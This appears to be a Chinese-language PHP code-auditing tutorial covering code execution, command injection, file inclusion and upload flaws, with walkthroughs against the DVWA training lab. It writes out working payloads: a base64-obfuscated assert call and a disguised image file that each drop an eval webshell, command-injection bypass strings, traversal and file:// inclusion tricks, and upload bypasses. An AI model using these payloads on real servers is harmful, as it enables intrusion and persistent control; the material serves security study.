<p>2，再看一个，测试代码如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//PHP 代码审计代码执行注入</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'orange'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$regexp</span> = <span class="variable">$_GET</span>[<span class="string">'orange'</span>];</span><br><span class="line">    <span class="variable">$String</span> = <span class="string">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span>;</span><br><span class="line">    var_dump(preg_replace(<span class="string">"/&lt;php&gt;(.*?)<span class="variable">$regexp</span>"</span>,<span class="string">"\\1"</span>,<span class="variable">$String</span>));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以看到代码有正则preg_replace()，所以现在需要/e参数，才能进行代码执行。</p>
<p>正则表达式过滤后是phpinfo()，正则表达式的意思是将String中含reg的字符串的样式去除。所以现在我们可以构造 payload：?orange=&lt;\/php&gt;/e   ，现在解释一下为什么，preg_replace()，/<php>(.<em>?)$regexp，接收的参数构造成正则表达式 /<php>(.</php></em>?)&lt;\/php&gt;/e，将$String也就是<php>phpinfo()&lt; /php&gt;过滤成phpinfo()，这样就可以成功执行了。</php></php></p>
<p> 3，参数注入，测试代码如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//PHP 代码审计代码执行注入</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'orange'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$regexp</span> = <span class="variable">$_GET</span>[<span class="string">'orange'</span>];</span><br><span class="line">    //<span class="variable">$String</span> = <span class="string">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span>;</span><br><span class="line">    //var_dump(preg_replace(<span class="string">"/&lt;php&gt;(.*?)<span class="variable">$regexp</span>"</span>,<span class="string">"\\1"</span>,<span class="variable">$String</span>));</span><br><span class="line">    preg_replace(<span class="string">"/orange/e"</span>,<span class="variable">$regexp</span>,<span class="string">"i am orange"</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>分析和上面差不多。<br>直接构造payload就好：?orange=phpinfo();</p>
<p> 4，动态函数执行—-一个超级隐蔽的后门</p>
<p>测试代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b]);?&gt; 仅用GET函数就构成了木马；利用方法payload：</span><br><span class="line"></span><br><span class="line">?a=assert&amp;b=<span class="variable">$&#123;fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))&#125;</span>;</span><br></pre></td></tr></table></figure></p>
<p>运行上述payload，会在同目录下生成c.php文件，里面的内容是&lt;?php @eval($_POST[c]); ?&gt;1，生成一句话木马。</p>
<h3 id="命令执行审计"><a href="#命令执行审计" class="headerlink" title="命令执行审计"></a>命令执行审计</h3><p>代码执行说的是可执行的php脚本代码，命令执行就是可以执行系统命令（cmd）或者是应用指令（bash），这个漏洞也是因为传参过滤不严格导致的，</p>
<p>一般我们说的php可执行命令的函数有这些：system();exec();shell_exec();passthru();pcntl_exec();popen();proc_open();</p>
<p>反引号也是可以执行的，因为他调用了shell_exec这个函数。</p>
<p>1，测试代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$orange</span>=<span class="variable">$_GET</span>[<span class="string">'orange'</span>];</span><br><span class="line">system(<span class="variable">$orange</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>直接GET传参，然后system()—-执行shell命令也就是向dos发送一条指令</p>
<p>payload:?orange=net user   查看一下电脑的用户。</p>
<p>2，再演示一个popen()函数<br>测试代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">popen(<span class="string">'net user&gt;&gt;C:/Users/ww/Desktop/1234.txt'</span>,<span class="string">'r'</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>只要php文件运行，就会在上述路径生成1234.txt文件，里面的内容是net user的结果。</p>
<p>3，反引号命令执行</p>
<p>测试代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> `net user`;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">直接<span class="built_in">echo</span> ，直接就可以执行命令</span><br><span class="line"></span><br><span class="line">DVWA分析</span><br><span class="line"></span><br><span class="line">选择low级别，先进行一下黑盒测试。</span><br><span class="line"></span><br><span class="line">输入8.8.8.8&amp;&amp;net user，可以看到成功执行两条命令</span><br><span class="line"></span><br><span class="line">下面分析一下，相关函数介绍 </span><br><span class="line">```bash</span><br><span class="line">stristr(string,search,before_search)</span><br></pre></td></tr></table></figure></p>
<p>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_uname(mode)</span><br></pre></td></tr></table></figure></p>
<p>这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。</p>
<p>命令连接符<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp;&amp; command2   先执行command1后执行command2</span><br><span class="line">command1 | command2     只执行command2</span><br><span class="line">command1 &amp; command2    先执行command2后执行command1</span><br></pre></td></tr></table></figure></p>
<p>以上三种连接符在windows和linux环境下都支持<br>如果程序没有进行过滤，那么我们就可以通过连接符执行多条系统命令。</p>
<p>可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。</p>
<p>看下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping <span class="built_in">command</span>. </span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">        // Windows </span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  '</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // *nix </span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  -c 4 '</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // Feedback <span class="keyword">for</span> the end user </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$cmd</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>上面代码可以清楚的看到，对输入的命令没有过滤，直接进行参数的传递。可以通过用“&amp;&amp;”和“;”来执行额外的命令 ping 8.8.8.8&amp;&amp;net user</p>
<p>选择medium级别，先进行黑盒测试，</p>
<p>发现输入：8.8.8.8&amp;&amp;net user，不可以用，这个时候可以去掉一个，输入：8.8.8.8&amp;net user，是可以”成功“的。</p>
<p>但是这里需要注意的是”&amp;&amp;”与”    &amp;”的区别：<br>Command 1&amp;&amp;Command 2<br>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p>
<p>Command 1&amp;Command 2<br>先执行Command 1，不管是否成功，都会执行Command 2</p>
<p>这个时候我们看下代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Set blacklist </span><br><span class="line">    <span class="variable">$substitutions</span> = array( </span><br><span class="line">        <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">    ); </span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars <span class="keyword">in</span> the array (blacklist). </span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping <span class="built_in">command</span>. </span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">        // Windows </span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  '</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // *nix </span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  -c 4 '</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // Feedback <span class="keyword">for</span> the end user </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$cmd</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>相比Low级别的代码，服务器端对ip参数做了一定过滤，即把”&amp;&amp;” ,”;”删除，本质上采用的是黑名单机制，因此依旧存在安全问题。</p>
<p>这个时候就可以开始利用了</p>
<p>***因为被过滤的只有”&amp;&amp;”与”    ;”，所以”&amp;”不会受影响。所以可以输入：8.8.8.8&amp;net user</p>
<p>***由于使用的是str_replace把”&amp;&amp;”,”;”替换为空字符，因此可以采用以下方式绕过： 8.8.8.8;&amp;net user</p>
<p>这是因为”8.8.8.8&amp;;&amp;net user”中的” ;”会被替换为空字符，这样一来就变成了”8.8.8.8&amp;;&amp;net user” ,会成功执行。</p>
<p>选择high级别，先进行黑盒测试，结果发现，好多都被过滤掉了，没关系，看下代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ]); </span><br><span class="line"></span><br><span class="line">    // Set blacklist </span><br><span class="line">    <span class="variable">$substitutions</span> = array( </span><br><span class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">'| '</span> =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>, </span><br><span class="line">    ); </span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars <span class="keyword">in</span> the array (blacklist). </span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping <span class="built_in">command</span>. </span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">        // Windows </span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  '</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // *nix </span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  -c 4 '</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // Feedback <span class="keyword">for</span> the end user </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$cmd</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>相比Medium级别的代码，High级别的代码进一步完善了黑名单，但由于黑名单机制的局限性，我们依然可以绕过。</p>
<p>漏洞利用</p>
<p>Command 1 | Command 2<br>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。<br>黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是    ”|” 就有用了。</p>
<p>输入：8.8.8.8|net user   </p>
<p>下图成功执行。</p>
<h3 id="文件包含审计"><a href="#文件包含审计" class="headerlink" title="文件包含审计"></a>文件包含审计</h3><p> PHP的文件包含可以直接执行包含文件的代码，包含的文件格式是不受限制的，只要能正常执行即可。</p>
<p>文件包含有这么两种：本地包含（LFI）和远程包含(RFI)。，顾名思义就能理解它们的区别在哪。</p>
<p>审计的时候函数都是一样的,这个四个包含函数： include() ; include_once() ; require();require_once().include 和 require 语句是相同的，除了错误处理方面：require 会生成致命错误（E_COMPILE_ERROR）并停止脚本,include 只生成警告（E_WARNING），并且脚本会继续。</p>
<p>先说一下本地包含，本地包含就指的是只能包含本机文件的漏洞，一般要配合上传，或者是已控的数据库来进行使用。</p>
<p>先写个简单的代码测试一下。</p>
<p>在www目录下新建两个php文件，baohan1.php，baohan2.php</p>
<p>baohan2.php代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">baohan1.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">"baohan2.php"</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">打开baohan1.php，可以看到成功执行baohan2.php的代码，成功把banhan2.php给包含了</span><br><span class="line"></span><br><span class="line">这个时候稍微修改下代码。把baohan1.php的：include(<span class="string">"baohan2.php"</span>);改成include(<span class="string">"baohan2.txt"</span>);</span><br><span class="line"></span><br><span class="line">把baohan2.php改成baohan2.txt。再次访问baihan1.php，可以看到成功包含，</span><br><span class="line"></span><br><span class="line">接下来将baohan2.txt文件的扩展名分别改为jpg、rar、doc、xxx进行测试，发现都可以正确显示phpinfo信息。由此可知，只要文件内容符合PHP语法规范，那么任何扩展名都可以被PHP解析。</span><br><span class="line"></span><br><span class="line">再来看一下远程文件包含</span><br><span class="line"></span><br><span class="line">当服务器的php配置中选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件。如果对文件来源没有检查的话，就容易导致任意远程代码执行。</span><br><span class="line"></span><br><span class="line">allow_url_include在默认情况下是关闭的，如果想要实验测试的话，可以去打开，但是真实环境中建议关闭。</span><br><span class="line"></span><br><span class="line">DVWA分析</span><br><span class="line"></span><br><span class="line">先选择low级别，先进行黑盒测试一下，进行包含，看到file1,file2,file3，试下file4，因为file.php存在，结果包含到了，并且提示you  are  rigjt。</span><br><span class="line"></span><br><span class="line">这个时候可以进一步操作，可以使用../让目录回到上级目录，以此来进行目标目录（通过多个../可以让目录回到根目录中然后再进入目标目录），</span><br><span class="line"></span><br><span class="line">试一下吧，?page=../../php.ini   ，除了这么多还有其他的操作等待你去挖掘。</span><br><span class="line"></span><br><span class="line">现在分析一下代码</span><br><span class="line">```bash</span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// The page we wish to display </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以看到直接接收page参数，没有进行任何过滤操作，所以造成文件包含漏洞。</p>
<p>下面选择medium，先看下代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// The page we wish to display </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line">// Input validation </span><br><span class="line"><span class="variable">$file</span> = str_replace( array( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, <span class="variable">$file</span> ); </span><br><span class="line"><span class="variable">$file</span> = str_replace( array( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, <span class="variable">$file</span> ); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>增加了str_replace()函数，把传入的url里面的http，https，../，..\  替换成空格，但是使用str_replace函数是不安全的，因为可以使用双写绕过替换规则</p>
<p>比如：http和https可以用ht<a href="http://tp:给绕过，因为只是过滤了../和..\，所以可以用绝对路径进行绕过：?page=./..././..././../php.ini" target="_blank" rel="noopener">http://tp:给绕过，因为只是过滤了../和..\，所以可以用绝对路径进行绕过：?page=./..././..././../php.ini</a></p>
<p>选择high级别，看下代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// The page we wish to display </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line">// Input validation </span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">"file*"</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">"include.php"</span> ) &#123; </span><br><span class="line">    // This isn<span class="string">'t the page we want! </span></span><br><span class="line"><span class="string">    echo "ERROR: File not found!"; </span></span><br><span class="line"><span class="string">    exit; </span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>使用了fnmatch函数：fnmatch() 函数根据指定的模式来匹配文件名或字符串。</p>
<p>检查page参数，要求page参数的开头必须是file开头，服务器才回去包含，但是我们可以利用file协议绕过防护策略，然后再进行包含</p>
<p>payload：?page=file://D:/wamp/www/DVWA-1.9/php.ini</p>
<p>最后看一下impossiable级别的代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// The page we wish to display </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line">// Only allow include.php or file&#123;1..3&#125;.php </span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$file</span> != <span class="string">"include.php"</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">"file1.php"</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">"file2.php"</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">"file3.php"</span> ) &#123; </span><br><span class="line">    // This isn<span class="string">'t the page we want! </span></span><br><span class="line"><span class="string">    echo "ERROR: File not found!"; </span></span><br><span class="line"><span class="string">    exit; </span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>可以看到代码很简洁，page参数只能是”include.php”，”file1.php”，”file2.php”，”file3.php”</p>
<p> 否则直接exit。彻底不能文件包含了。</p>
<p>最后的最后再分享个文件包含的渗透小技巧</p>
<p>***读取敏感文件是文件包含漏洞的主要利用方式之一，比如服务器采用Linux系统，而用户又具有相应的权限，那么就可以利用文件包含漏洞去读取/etc/passwd文件的内容。</p>
<p>系统中常见的敏感信息路径如下：<br>windows系统</p>
<p>linux系统</p>
<p>***文件包含漏洞的主要利用方式是配合文件上传。比如大多数网站都会提供文件上传功能，但一般只允许上传jpg或gif等图片文件，通过配合文件包含漏洞就可以在网站中生成一句话木马网页文件。<br>比如，在记事本中写入下面这段代码，并将之保存成jpg文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">fwrite(fopen(<span class="string">"orange.php"</span>,<span class="string">"w"</span>),<span class="string">'&lt;?php @eval($_POST[orange]);?&gt;'</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以成功进行包含，并且得到了一个orange.php一句话木马文件，密码是orange。进而进行下一步攻击。</p>
<h3 id="文件上传审计"><a href="#文件上传审计" class="headerlink" title="文件上传审计"></a>文件上传审计</h3><p>其实个人认为文件上传黑盒测试的时候姿势特别多，白盒测试的时候除了明显的限制上传文件的类型外，白盒审计不如黑盒测试来的”刺激”。</p>
<p>文件上传应该是最常用的漏洞了，上传函数就那一个 move_uploaded_file();一般来说找这个漏洞就是直接ctrl+f 直接开搜。遇到没有过滤的直接传个一句话的webshell上去。</p>
<p>上传的漏洞比较多，Apache配置，iis解析漏洞等等。在php中一般都是黑白名单过滤，或者是文件头，content-type等等。一般来找上传的过滤函数进行分析就行。</p>
<p>(1) 未过滤或本地过滤：服务器端未过滤，直接上传PHP格式的文件即可利用。</p>
<p>(2) 黑名单扩展名过滤：限制不够全面：IIS默认支持解析.asp,.cdx, .asa,.cer等。不被允许的文件格式.php，但是我们可以上传文件名为1.php (注意后面有一个空格)</p>
<p>(3) 文件头 content-type验证绕过：getimagesize()函数：验证文件头只要为GIF89a，就会返回真。限制$_FILES[“file”][“type”]的值 就是人为限制content-type为可控变量。</p>
<p>(4)过滤不严或被绕过：比如大小写问题，网站只验证是否是小写，我们就可以把后缀名改成大写。</p>
<p>(5)文件解析漏洞：比如 Windows 系统会涉及到这种情况：文件名为1.php;.jpg，IIS 6.0 可能会认为它是jpg文件，但是执行的时候会以php文件来执行。我们就可以利用这个解析漏洞来上传。再比如 Linux 中有一些未知的后缀，比如a.php.xxx。由于 Linux 不认识这个后缀名，它就可能放行了，攻击者再执行这个文件，网站就有可能被控制。</p>
<p>(6)路径截断：就是在上传的文件中使用一些特殊的符号，使文件在上传时被截断。比如a.php%00.jpg，这样在网站中验证的时候，会认为后缀是jpg，但是保存到硬盘的时候会被截断为a.php，这样就是直接的php文件了。常用来截断路径的字符是：\0  , ?  ,  %00  ,   也可以超长的文件路径造成截断。</p>
<p>(7)等等等等，以后慢慢补充</p>
<p>忘了编译器了，编辑器漏洞和文件上传漏洞原理一样，只不过多了一个编辑器。上传的时候还是会把我们的脚本上传上去。不少编译器本身就存在文件上传漏洞，举个栗子：进入网站后台后如果找不到上传的地方或者其他姿势不好使的时候，就可以从编译器下手进行上传，从而GETSHELL。常见的编译器有：Ewebeditor,fckeditor,ckeditor,kindeditor等等。百度搜索各种编译器利用的相关姿势。网上很多这里就不写了。</p>
<p>先了解一下PHP通过$_FILES对象来读取文件，以便于下面的理解</p>
